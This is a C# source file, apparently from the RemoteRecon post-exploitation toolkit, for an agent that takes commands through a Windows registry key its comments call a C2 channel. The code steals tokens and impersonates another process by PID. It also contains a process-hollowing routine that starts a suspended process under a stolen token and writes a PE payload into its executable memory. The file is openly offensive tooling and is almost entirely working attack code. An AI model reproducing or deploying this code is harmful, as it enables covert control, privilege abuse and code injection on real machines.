using System;
using System.Text;
using Microsoft.Win32;
using System.Security.Principal;
using System.Security;
using System.Runtime.InteropServices;
using System.IO;
using System.Threading;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels.Ipc;
using System.Runtime.Remoting.Channels;
using System.Diagnostics;
using RemoteReconKS;

namespace RemoteReconCore
{
    public class Agent
    {
        //static vars 
        public static int sleep = 5;
        public static WindowsImpersonationContext context = null;
        public static string exceptionInfo;
        public Agent()
        {

        }

        public void Run(string basepath, string runkey, string commandkey, string argumentkey, string resultkey, string keylogkey, string screenshotkey)
        {
            RegistryKey hklm = Registry.LocalMachine;
            RegistryKey RemoteReconBase;

            //Open the base registry path for RemoteRecon C2
            try
            {
                RemoteReconBase = hklm.OpenSubKey(basepath, RegistryKeyPermissionCheck.ReadWriteSubTree);
            }
            catch (Exception)
            {
                //If we cant open the DarkRecon subkey, set to null so we cleanly exit
                RemoteReconBase = null;
            }

            //Main loop

            while ((RemoteReconBase != null) && (RemoteReconBase.GetValue(runkey) != null))
            {
                string result = "";
                string command = (string)RemoteReconBase.GetValue(commandkey);

                switch (command)
                {
                    case "impersonate":
                        //Obtain the pid from the arg key
                        string pid = (string)RemoteReconBase.GetValue(argumentkey);
                        RemoteReconBase.SetValue(argumentkey, "");
                        RemoteReconBase.SetValue(commandkey, "");
                        if (pid != null)
                        {
                            int ipid = Convert.ToInt32(pid);
                            context = impersonate(ipid);
                            result = "impersonated: " + WindowsIdentity.GetCurrent().Name;

                            if (context == null)
                            {
                                result = "impersonation failed";
                            }
                            //Write the result to the registry for retrieval
                            RemoteReconBase.SetValue(resultkey, Convert.ToBase64String(Encoding.ASCII.GetBytes(result)));
                            break;
                        }
                        result = "missing command argument";
                        RemoteReconBase.SetValue(resultkey, Convert.ToBase64String(Encoding.ASCII.GetBytes(result)));
                        break;

                    default:
                        break;
                }

                Thread.Sleep((sleep * 1000));
            }
        }

        public static WindowsImpersonationContext impersonate(int pid)
        {
            IntPtr hProcHandle = IntPtr.Zero;
            IntPtr hProcToken = IntPtr.Zero;

            WindowsImpersonationContext ctx = null;

            hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid);

            if (hProcHandle == IntPtr.Zero)
            {
                hProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid);
                if (hProcHandle == IntPtr.Zero)
                {
                    return ctx;
                }
            }

            bool success = WinApi.OpenProcessToken(hProcHandle, WinApi.TOKEN_ALL_ACCESS, out hProcToken);

            if (!success)
            {
                return ctx;
            }

            WindowsIdentity newId = new WindowsIdentity(hProcToken);

            try
            {
                ctx = newId.Impersonate();
            }
            catch (Exception)
            {
                return null;
            }

            return ctx;
        }

        public static bool hollowProcess(string path, int pid, byte[] pebytes)
        {
            IntPtr ProcHandle = IntPtr.Zero;
            IntPtr hTokenhandle = IntPtr.Zero;

           
            if (!File.Exists(path))
            {
                return false;
            }

            PEloader pe = new PEloader(pebytes);

            //Steal the token from the target process
            ProcHandle = WinApi.OpenProcess(WinApi.PROCESS_ALL_ACCESS, true, pid);
            if (ProcHandle == IntPtr.Zero)
            {
                ProcHandle = WinApi.OpenProcess(WinApi.PROCESS_QUERY_INFORMATION, true, pid);
                if (ProcHandle == IntPtr.Zero)
                {
                    return false;
                }
            }

            bool success = WinApi.OpenProcessToken(ProcHandle, WinApi.TOKEN_ALL_ACCESS, out hTokenhandle);
            if (!success)
            {
                return false;
            }

            //Create the suspended process
            WinApi.STARTUPINFO sinfo = new WinApi.STARTUPINFO();
            WinApi.PROCESS_INFORMATION pi = new WinApi.PROCESS_INFORMATION();
            WinApi.SECURITY_ATTRIBUTES processattributes = new WinApi.SECURITY_ATTRIBUTES();
            WinApi.SECURITY_ATTRIBUTES threadattributes = new WinApi.SECURITY_ATTRIBUTES();
            success = WinApi.CreateProcessAsUser(hTokenhandle, path, null, ref processattributes, ref threadattributes, false, ((uint)WinApi.ProcessCreationFlags.CREATE_NO_WINDOW | (uint)WinApi.ProcessCreationFlags.CREATE_SUSPENDED), IntPtr.Zero, null, ref sinfo, out pi);

            if (!success)
            {
                WinApi.CloseHandle(ProcHandle);
                WinApi.CloseHandle(hTokenhandle);
                return false;
            }

            //Process has been created in a suspended state. 
            Process targetProc = Process.GetProcessById(pi.dwProcessId);
            ProcessModule main = targetProc.MainModule;
            IntPtr tBaseAddress = main.BaseAddress;


            if (tBaseAddress == (IntPtr)pe.OptionalHeader64.ImageBase)
            {
                WinApi.NtUnmapViewOfSection(pi.hProcess, tBaseAddress);
            }

            //Allocate mem in the new process
            IntPtr address = WinApi.VirtualAllocEx(pi.hProcess, tBaseAddress, pe.OptionalHeader64.SizeOfImage, (WinApi.AllocationType.Commit | WinApi.AllocationType.Reserve), WinApi.MemoryProtection.ExecuteReadWrite);
            if (address == IntPtr.Zero)
            {
                targetProc.Kill();
                return false;
            }

            IntPtr imagePtr = Marshal.AllocHGlobal(pe.RawBytes.Length);
            Marshal.Copy(pe.RawBytes, 0, imagePtr, pe.RawBytes.Length);

            //WinApi.NtWriteVirtualMemory(pi.hProcess, address, imagePtr, pe.OptionalHeader64.SizeOfHeaders, IntPtr.Zero);

            for (int i = 0; i < pe.FileHeader.NumberOfSections; i++)
            {
                //subtee code but v2.0 compatible way
                IntPtr destAddress = new IntPtr(address.ToInt64() + (int)pe.ImageSectionHeaders[i].VirtualAddress);
                IntPtr y = WinApi.VirtualAllocEx(pi.hProcess, destAddress, pe.ImageSectionHeaders[i].SizeOfRawData, (WinApi.AllocationType.Commit | WinApi.AllocationType.Reserve), WinApi.MemoryProtection.ExecuteReadWrite);

                WinApi.NtWriteVirtualMemory(pi.hProcess, y, new IntPtr(imagePtr.ToInt64() + (int)pe.ImageSectionHeaders[i].VirtualAddress), pe.ImageSectionHeaders[i].SizeOfRawData, IntPtr.Zero);
            }
            return true;
        }
    }
}
